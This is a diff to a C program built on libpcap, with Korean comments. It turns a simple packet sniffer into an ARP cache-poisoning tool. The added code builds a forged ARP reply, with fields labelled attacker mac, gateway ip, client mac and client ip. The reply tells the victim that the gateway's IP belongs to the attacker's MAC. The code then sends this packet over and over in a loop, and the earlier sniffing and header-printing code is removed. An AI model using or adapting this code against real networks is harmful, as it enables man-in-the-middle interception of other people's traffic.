@@ -41,6 +41,14 @@ struct arp_hdr {
     uint8_t target_mac_address[6];
     uint8_t target_ip_address[4];
 }; //28
+
+struct ether_header1{
+    uint8_t  ether_dhost[6];   /* destination eth addr   */
+    uint8_t  ether_shost[6];   /* source ether addr   */
+    uint16_t ether_type;    /* packet type ID field   */
+};
+
+
 int main(int argc, char **argv)
 {
     char *dev;    // 네트워크 디바이스
@@ -51,41 +59,55 @@ int main(int argc, char **argv)
     bpf_u_int32 netp;  // 네트워크 디바이스의 네트워크 주소가 저장될 주소
     bpf_u_int32 maskp; // 네트워크 디바이스의 넷마스크 주소가 저장될 주소
     struct in_addr addr;
-    struct in_addr net_addr, mask_addr;
     struct pcap_pkthdr *pkt_hdr;
     const u_char *pkt_data;
     pcap_t *pcd;
     int res;
     u_int8_t j[42];
     struct arp_hdr a;
+    struct ether_header1 b;
 
     a.hardware_type = htons(1); //3
-    a.protocol_type = htons(0x0806);
+    a.protocol_type = htons(0x0800);
     a.hardwar_size = 0x06;
     a.protocol_size = 0x04;
     a.opcode = htons(0x0002);
-    a.sender_mac_address[0] = 0x00; // 2
-    a.sender_mac_address[1] = 0x0C;
+    a.sender_mac_address[0] = 0x00; // 2 attacker mac
+    a.sender_mac_address[1] = 0x0c;
     a.sender_mac_address[2] = 0x29;
     a.sender_mac_address[3] = 0x12;
     a.sender_mac_address[4] = 0x6a;
     a.sender_mac_address[5] = 0xcc;
-    a.sender_ip_address[0] = 0xc0;
+    a.sender_ip_address[0] = 0xc0; // gateway ip
     a.sender_ip_address[1] = 0xa8;
     a.sender_ip_address[2] = 0xb3;
-    a.sender_ip_address[3] = 0x89;
-    a.target_mac_address[0] = 0x00; // 1
-    a.target_mac_address[1] = 0x50;
-    a.target_mac_address[2] = 0x56;
-    a.target_mac_address[3] = 0xfe;
-    a.target_mac_address[4] = 0xb8;
-    a.target_mac_address[5] = 0x00;
-    a.target_ip_address[0] = 0xc0;
+    a.sender_ip_address[3] = 0x02;
+    a.target_mac_address[0] = 0x00; // 1 client mac
+    a.target_mac_address[1] = 0x0c;
+    a.target_mac_address[2] = 0x29;
+    a.target_mac_address[3] = 0xAE;
+    a.target_mac_address[4] = 0x73;
+    a.target_mac_address[5] = 0xF4;
+    a.target_ip_address[0] = 0xc0; // client ip
     a.target_ip_address[1] = 0xa8;
     a.target_ip_address[2] = 0xb3;
-    a.target_ip_address[3] = 0x02;
+    a.target_ip_address[3] = 0x80;
 
+    b.ether_dhost[0] = 0x00;
+    b.ether_dhost[1] = 0x0c;
+    b.ether_dhost[2] = 0x29;
+    b.ether_dhost[3] = 0xae;
+    b.ether_dhost[4] = 0x73;
+    b.ether_dhost[5] = 0xf4;
 
+    b.ether_shost[0] = 0x00;
+    b.ether_shost[1] = 0x0c;
+    b.ether_shost[2] = 0x29;
+    b.ether_shost[3] = 0x12;
+    b.ether_shost[4] = 0x6a;
+    b.ether_shost[5] = 0xcc;
+
+    b.ether_type = htons(0x0806);
 
     dev = argv[2];
 
@@ -147,12 +169,9 @@ int main(int argc, char **argv)
     struct tcphdr *tcph;
     int length=0;
 
-    //while((res = pcap_next_ex(pcd, &pkt_hdr, &pkt_data))>=0)
+    while((res = pcap_next_ex(pcd, &pkt_hdr, &pkt_data))>=0)
     {
-        //if(res==0) continue;
-        res = pcap_next_ex(pcd, &pkt_hdr, &pkt_data);
-        ep = (struct ether_header *)pkt_data;
-        memcpy(j, (u_int8_t*)ep, 14);
+        memcpy(j, (u_int8_t*)&b, 14);
         length = length + 14;
         memcpy(j+length, (u_int8_t*)&a, 28);
 
@@ -163,46 +182,17 @@ int main(int argc, char **argv)
                 printf("\n");
             }
             printf("%02x ", j[x]);
+
         }
         printf("\n");
+        pcap_sendpacket(pcd, (const u_char*)j, sizeof(j));
 
-        switch(ntohs(ep->ether_type))
-        {
-            case ETHERTYPE_IP:
-            {
-                pkt_data = pkt_data + sizeof(struct ether_header); // 크기
-                // DST + SRC + EtherType (0x080 = ip)
-                // IP 헤더에서 데이타 정보를 출력한다.
-                iph = (struct ip *)pkt_data;
-                printf("Version     : %d\n", iph->ip_v);
-                printf("Header Len  : %d\n", iph->ip_hl);
-                printf("TTL         : %d\n", iph->ip_ttl);
-                printf("SRC IP      : %s\n", inet_ntoa(iph->ip_src));
-                printf("DST IP      : %s\n", inet_ntoa(iph->ip_dst));
-
-                    switch (iph->ip_p)
-                    {
-                        case IPPROTO_TCP:
-                        tcph = (struct tcphdr *)(pkt_data + iph->ip_hl * 4);
-                        printf("Src Port : %d\n" , ntohs(tcph->th_sport));
-                        printf("Dst Port : %d\n" , ntohs(tcph->th_dport));
-                        printf("\n");
-                    }
-                    break;
-            }
-            break;
-
-            pcap_sendpacket(pcd, (const u_char*)&j, 42);
-
-        }
-
+    }
     // -1 == 에러가 발생했을 때
     if (res == -1)
     {
        printf("Error : %s\n",errbuf);
        exit(0);
     }
-  }
 }
-
 
